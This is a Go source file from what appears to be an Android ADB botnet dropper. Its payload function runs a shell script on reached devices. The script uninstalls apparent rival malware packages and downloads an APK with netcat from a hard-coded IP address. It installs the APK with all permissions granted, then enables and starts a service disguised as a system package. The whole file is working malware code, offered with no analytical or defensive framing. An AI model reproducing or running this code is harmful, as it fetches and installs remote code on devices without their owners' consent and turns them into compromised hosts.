package main

import (
	"android/internal/adb"
	"strings"
	//"os"
)

var (
	handlePayload = func(c *adb.Client) error {
 //   _ = c.Push("resources/install2.sh", "/sdcard/lololol", 0)
		_ = c.Shell(strings.Join([]string{
`#!/system/bin/sh

DIR=/data/local/tmp
IP=5.175.215.37

APK="$DIR/app9382"
PKG="com.android.systemdex"
SERVICE="$PKG/.services.SDKNotificationService"

EXPECTED_HASH="8380296e943944f1ff4eb149d9ef661a36d52d7a873918e7df410694949a40a4"
MAX_ATTEMPTS=2

run() {
expected="$1"
shift

for cmd in "$@"; do
	out="$($cmd 2>/dev/null)"
	echo "$out" | grep -q "$expected" && {
	echo "> $cmd: Success"
	return 0
}
done

return 1
}

# clean pkgs
pm uninstall com.android.log_handler_v2 >/dev/null 2>&1 &
pm uninstall com.oreo.mcflurry >/dev/null 2>&1 &
pm uninstall com.google.android.pms.update >/dev/null 2>&1 &
pm uninstall com.google.android.gms.update >/dev/null 2>&1 &
wait

# attempt download
i=1
while [ "$i" -le "$MAX_ATTEMPTS" ]; do
rm -f "$APK"

# download apk
if (nc "$IP" 6969 || toybox nc "$IP" 6969 || busybox nc "$IP" 6969) | dd of="$APK"; then
	HASH=$((sha256sum "$APK" || busybox sha256sum "$APK" || toybox sha256sum "$APK") 2>/dev/null | cut -d' ' -f1)
[ "$HASH" = "$EXPECTED_HASH" ] && { echo "[+] Download done"; break; }
fi

echo "[!] Fail or mismatch, retrying: $i/$MAX_ATTEMPTS"
i=$((i + 1))
done

# install pkg
run "Success" \
"pm install -g $APK" \
"pm install -r -g $APK" \
"cmd package install -r -g $APK" \
"cmd package install -g $APK"

run "enabled" \
"pm enable $PKG" \
"cmd package set-app-enabled-setting $PKG enabled" \
"cmd package enable $PKG" \
"am broadcast -a $PKG.ENABLE_APP"

run "Starting" \
"am start-foreground-service -n $SERVICE" \
"am startservice -n $SERVICE" \
"cmd activity start -n $SERVICE"`,
		}, "\n"), nil)
  
		return nil
	}
)
 
